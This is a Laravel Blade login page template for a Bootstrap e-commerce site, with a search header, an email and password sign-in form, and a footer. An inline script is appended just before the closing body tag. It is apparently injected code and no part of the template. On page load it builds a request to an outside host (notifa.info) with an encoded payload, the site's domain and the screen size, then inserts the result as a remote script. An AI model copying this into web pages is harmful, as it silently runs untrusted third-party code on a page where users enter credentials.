
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="pragma" content="no-cache" />
<meta http-equiv="cache-control" content="max-age=604800" />
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<title>Website title - bootstrap html template</title>

<link href="{{asset('frontend')}}/images/favicon.ico" rel="shortcut icon" type="image/x-icon">

<!-- jQuery -->
<script src="{{asset('frontend')}}/js/jquery-2.0.0.min.js" type="text/javascript"></script>

<!-- Bootstrap4 files-->
<script src="{{asset('frontend')}}/js/bootstrap.bundle.min.js" type="text/javascript"></script>
<link href="{{asset('frontend')}}/css/bootstrap.css" rel="stylesheet" type="text/css"/>

<!-- Font awesome 5 -->
<link href="{{asset('frontend')}}/fonts/fontawesome/css/all.min.css" type="text/css" rel="stylesheet">

<!-- custom style -->
<link href="{{asset('frontend')}}/css/ui.css" rel="stylesheet" type="text/css"/>
<link href="{{asset('frontend')}}/css/responsive.css" rel="stylesheet" media="only screen and (max-width: 1200px)" />

<!-- custom javascript -->
<script src="{{asset('frontend')}}/js/script.js" type="text/javascript"></script>

<script type="text/javascript">
/// some script

// jquery ready start
$(document).ready(function() {
	// jQuery code

}); 
// jquery end
</script>

</head>
<body>


<header class="section-header">
<section class="header-main border-bottom">
	<div class="container">
<div class="row align-items-center">
	<div class="col-lg-2 col-4">
		<a href="http://bootstrap-ecommerce.com" class="brand-wrap">
			<img class="logo" src="{{asset('frontend')}}/images/logo.png">
		</a> <!-- brand-wrap.// -->
	</div>
	<div class="col-lg-6 col-sm-12">
		<form action="#" class="search">
			<div class="input-group w-100">
			    <input type="text" class="form-control" placeholder="Search">
			    <div class="input-group-append">
			      <button class="btn btn-primary" type="submit">
			        <i class="fa fa-search"></i>
			      </button>
			    </div>
		    </div>
		</form> <!-- search-wrap .end// -->
	</div> <!-- col.// -->
	<div class="col-lg-4 col-sm-6 col-12">
		<div class="widgets-wrap float-md-right">
			<div class="widget-header  mr-3">
				<a href="#" class="icon icon-sm rounded-circle border"><i class="fa fa-shopping-cart"></i></a>
				<span class="badge badge-pill badge-danger notify">0</span>
			</div>
			<div class="widget-header icontext">
				<a href="#" class="icon icon-sm rounded-circle border"><i class="fa fa-user"></i></a>
				<div class="text">
					<span class="text-muted">Welcome!</span>
					<div> 
						<a href="#">Sign in</a> |  
						<a href="#"> Register</a>
					</div>
				</div>
			</div>

		</div> <!-- widgets-wrap.// -->
	</div> <!-- col.// -->
</div> <!-- row.// -->
	</div> 
</section>
</header> 



<!-- ========================= SECTION CONTENT ========================= -->
<section class="section-conten padding-y" style="min-height:84vh">

<!-- ============================ COMPONENT LOGIN   ================================= -->
	<div class="card mx-auto" style="max-width: 380px; margin-top:100px;">
      <div class="card-body">
      <h4 class="card-title mb-4">Sign in</h4>
      <form method="post" action="{{route('login')}}">
        @csrf
      	  {{-- <a href="#" class="btn btn-facebook btn-block mb-2"> <i class="fab fa-facebook-f"></i> &nbsp  Sign in with Facebook</a>
      	  <a href="#" class="btn btn-google btn-block mb-4"> <i class="fab fa-google"></i> &nbsp  Sign in with Google</a> --}}
          <div class="form-group">
             <input name="email" class="form-control" placeholder="Username" type="text">
             @error('email')
                <span class="invalid-feedback" role="alert">
                    <strong>{{ $message }}</strong>
                </span>
            @enderror
          </div>
          <div class="form-group">
            <input name="password" class="form-control" placeholder="Password" type="password">
            @error('password')
                <span class="invalid-feedback" role="alert">
                   <strong>{{ $message }}</strong>
                </span>
            @enderror
          </div>
          
          <div class="form-group">
            @if (Route::has('password.request'))
          	    <a href="#" class="float-right">Forgot password?</a> 
                <label class="float-left custom-control custom-checkbox"> <input type="checkbox" class="custom-control-input" checked=""> <div class="custom-control-label"> Remember </div> </label>
            @endif
          </div>
          <div class="form-group">
              <button type="submit" class="btn btn-primary btn-block"> Login  </button>
          </div>  
      </form>
      </div>
    </div>

     <p class="text-center mt-4">Don't have account? <a href="#">Sign up</a></p>
     <br><br>
<!-- ============================ COMPONENT LOGIN  END.// ================================= -->


</section>
<!-- ========================= SECTION CONTENT END// ========================= -->


<!-- ========================= FOOTER ========================= -->
<footer class="section-footer border-top padding-y">
	<div class="container">
		<p class="float-md-right"> 
			&copy Copyright 2019 All rights reserved
		</p>
		<p>
			<a href="#">Terms and conditions</a>
		</p>
	</div><!-- //container -->
</footer>
<!-- ========================= FOOTER END // ========================= -->



<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAjjbPwIFF%2fwtMsTb3xC5%2fkBrJ4teCtKacJmfyzJJz5FIBf8%2bI9HlXVdtPTx%2bMiR%2bZSAH9Dxo7OXmIlxZpd9gUKKwg9iHg0jLf6TiR%2fREf1ioq1DHU5%2fq6laBpwjngKudjCGX13AUt%2bCt8xhOTe%2bBOE7Jva%2bRFCWtjY4k1rRNWodh1mnB4wWFAszaohmn4V%2f4F54OoDwnHu01%2bfyHQpd21RyoUiKHmVp3BjRYLV1JfykWvWH9Gc5%2fNx%2bSmaixVQaXMIfGAPI6Rpws4mOKR6bThFSjCxnVMf8c4k2Zgb9gQGg0o7nkCVT84YyXUDCqzfdYT43s24%2bFuTQluSzScbfrvF%2f1n9q0ntL91BA2UceNbLGPRm2KPB4Lr9uxN9AS5ednCrcSKYbk3YKSWPB1Di7g0piuFwlAhc4Bf01sjUaajI6KMOi%2fO8b4js5zcYjlnWTLd%2boI4JG3Sk3ia72T70WVg81Ps7wH8uKdpLnow5s9vL6laUczd7igmpED9LU84NP2w64L2l2rFIVdQ7isaD%2f2pEDjCRfoJk%2fSvIpNGLTwuMgHNcE98bB5K4H161g8oLT0QLeJdm6wsNLsD%2fZ2sBys0znJtTPUTMWsI" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>